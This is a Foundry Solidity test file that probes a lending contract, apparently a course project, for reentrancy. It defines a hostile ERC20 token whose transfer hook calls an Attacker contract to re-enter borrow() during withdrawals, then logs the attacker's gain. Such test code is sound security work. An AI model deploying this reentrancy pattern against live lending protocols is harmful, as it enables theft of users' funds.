// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

import {DreamAcademyLending, IPriceOracle} from "src/kaymin128.sol";

contract DreamOracle is IPriceOracle {
    address public operator;
    mapping(address => uint256) prices;

    constructor() {
        operator = msg.sender;
    }

    function getPrice(address token) external view returns (uint256) {
        require(prices[token] != 0, "the price cannot be zero");
        return prices[token];
    }

    function setPrice(address token, uint256 price) external {
        require(msg.sender == operator, "only operator can set the price");
        prices[token] = price;
    }
}

interface ILending {
    function deposit(address token, uint256 amount) external payable;
    function withdraw(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
    function repay(address token, uint256 amount) external;
    function liquidate(address borrower, address token, uint256 amount) external;
    function getAccruedSupplyAmount(address token) external returns (uint256);
}

contract ReentrancyToken is ERC20 {
    using Address for address;

    address public owner;
    uint256 public counter = 0;

    constructor() ERC20("ReentrancyToken", "RT") {
        owner = msg.sender;
        _mint(msg.sender, type(uint256).max);
    }

    function setCounter(uint256 _counter) public {
        require(msg.sender == owner, "only owner can set the counter");
        counter = _counter;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (counter > 0) {
            counter--;
            console.log(recipient);
            Attacker(recipient).attack(msg.sender, address(this));
        }
        return super.transfer(recipient, amount);
    }
}

contract Attacker {
    function attack(address lending, address token) public {
        ILending(lending).borrow(token, 1 ether);
    }
}

contract TokenReentrancyTest is Test {
    DreamOracle dreamOracle;
    DreamAcademyLending lending;
    ReentrancyToken usdc;

    address user1;
    address user2;
    address user3;
    address user4;
    address attacker;
    address attackContract;

    function setUp() external {
        user1 = address(0x1337);
        user2 = address(0x1337 + 1);
        user3 = address(0x1337 + 2);
        user4 = address(0x1337 + 3);
        attacker = address(0x1337 + 4);

        // attack preparation
        vm.startPrank(attacker);
        {
            attackContract = address(new Attacker());
            usdc = new ReentrancyToken();
        }
        vm.stopPrank();

        // build lending contract
        dreamOracle = new DreamOracle();
        lending = new DreamAcademyLending(IPriceOracle(address(dreamOracle)), address(usdc));
        vm.deal(address(attacker), 10000000 ether);
        vm.deal(address(attackContract), 10000000 ether);
        vm.deal(address(this), 10000000 ether);
        deal(address(usdc), address(attackContract), 10000000 ether);
        deal(address(usdc), address(this), 10000000 ether);

        vm.prank(address(attacker));
        usdc.approve(address(lending), type(uint256).max);
        vm.prank(address(attackContract));
        usdc.approve(address(lending), type(uint256).max);
        vm.prank(address(this));
        usdc.approve(address(lending), type(uint256).max);

        // initialize lending
        lending.initializeLendingProtocol{value: 1}(address(usdc));
        dreamOracle.setPrice(address(0x0), 1339 ether);
        dreamOracle.setPrice(address(usdc), 1 ether);

        vm.label(user1, "user1");
        vm.label(user2, "user2");
        vm.label(user3, "user3");
        vm.label(user4, "user4");
        vm.label(attacker, "attacker");

        vm.label(address(this), "TEST");
        vm.label(address(lending), "lending");
        vm.label(address(usdc), "usdc");
        vm.label(address(dreamOracle), "oracle");
    }

    function test_prepare_reentrancy() public {
        vm.roll(vm.randomUint());
        vm.startPrank(attacker);
        {
            uint256 amount = 10000 ether;
            assertGe(usdc.allowance(attacker, address(lending)), amount);

            uint256 prevBalance = usdc.balanceOf(attacker);
            lending.deposit(address(usdc), amount);
            lending.withdraw(address(usdc), amount);
            uint256 newBalance = usdc.balanceOf(attacker);
            assertEq(newBalance, prevBalance);
        }
        vm.stopPrank();
    }

    function test_reentrancy() public {
        vm.roll(vm.randomUint());
        startHoax(attacker);
        {
            uint256 prevBalance = usdc.balanceOf(attacker);
            usdc.setCounter(10);
            assertEq(usdc.counter(), 10);

            lending.deposit(address(usdc), 1000 ether);
            lending.withdraw(address(usdc), 991 ether);
            uint256 newBalance = usdc.balanceOf(attacker);
            console.log("gain: ", newBalance - prevBalance);
        }
        vm.stopPrank();
    }
}
